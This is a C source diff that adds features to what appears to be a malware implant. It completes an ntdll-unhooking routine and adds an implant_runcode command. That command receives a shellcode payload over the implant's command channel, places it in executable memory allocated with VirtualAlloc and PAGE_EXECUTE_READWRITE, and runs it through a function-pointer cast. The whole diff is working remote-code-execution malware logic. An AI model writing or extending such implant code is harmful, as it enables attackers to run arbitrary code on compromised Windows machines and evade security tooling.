@@ -542,6 +542,8 @@ int implant_unhookbyon(struct wrkr_trans_t* trans, struct unhookbyon_req_t* req)
         total_recvd += recvd;
     }
 
+    tremont_opts_stream(stream, OPT_NONBLOCK, 0, nexus);
+
     memset(&msg, 0, sizeof(msg));
     msg.msg_enum = UNHOOK_BYON;
     msg.unhookbyon.msg_enum = RES;
@@ -613,6 +615,68 @@ int implant_unhookbyon(struct wrkr_trans_t* trans, struct unhookbyon_req_t* req)
     _unfreeze_all_other_threads();
     CloseHandle(process_handle);
     free(ntdll_buf);
+
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_enum = UNHOOK_L;
+    msg.upload.msg_enum = FIN;
+    msg.upload.fin.sanity = 1;
+
+    tremont_send(trans->stream_id, (byte*)&msg,
+        sizeof(msg), trans->nexus);
+
+    memset(&msg, 0, sizeof(msg));
+    tremont_recv(trans->stream_id, (byte*)&msg,
+        sizeof(msg), trans->nexus);
+
+    tremont_end_stream(trans->stream_id, trans->nexus);
+
+    return 0;
+}
+
+int implant_runcode(struct wrkr_trans_t* trans, struct runcode_req_t* req) {
+    Tremont_Nexus* nexus = trans->nexus;
+    tremont_stream_id stream = trans->stream_id;
+
+    struct wrkr_msg_t msg;
+    msg.msg_enum = UNHOOK_BYON;
+    msg.upload.msg_enum = RES;
+    msg.upload.res.allowed = 1;
+
+    tremont_send(stream, (byte*)&msg,
+        sizeof(msg), nexus);
+
+    int64_t total_recvd = 0;
+    int64_t total_size = req->file_len;
+
+    int recvd = 0;
+    int written = 0;
+    char temp_buf[255];
+
+    tremont_opts_stream(stream, OPT_NONBLOCK, 1, nexus);
+
+    char* shellcode_buf;
+    shellcode_buf = VirtualAlloc(NULL, total_size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    while (total_recvd < total_size) {
+        recvd = tremont_recv(stream,
+            (byte*)temp_buf, sizeof(temp_buf), nexus);
+        memcpy(shellcode_buf + total_recvd, temp_buf, recvd);
+        total_recvd += recvd;
+    }
+
+    tremont_opts_stream(stream, OPT_NONBLOCK, 0, nexus);
+
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_enum = UNHOOK_BYON;
+    msg.unhookbyon.msg_enum = RES;
+    msg.unhookbyon.unhooking.sanity = 1;
+
+    tremont_send(stream, (byte*)&msg, sizeof(msg), nexus);
+
+    ((void(*)())(shellcode_buf))(); //my favorite thing in all of C
+
+    VirtualFree(shellcode_buf, total_size, MEM_RELEASE);
 
     memset(&msg, 0, sizeof(msg));
     msg.msg_enum = UNHOOK_L;
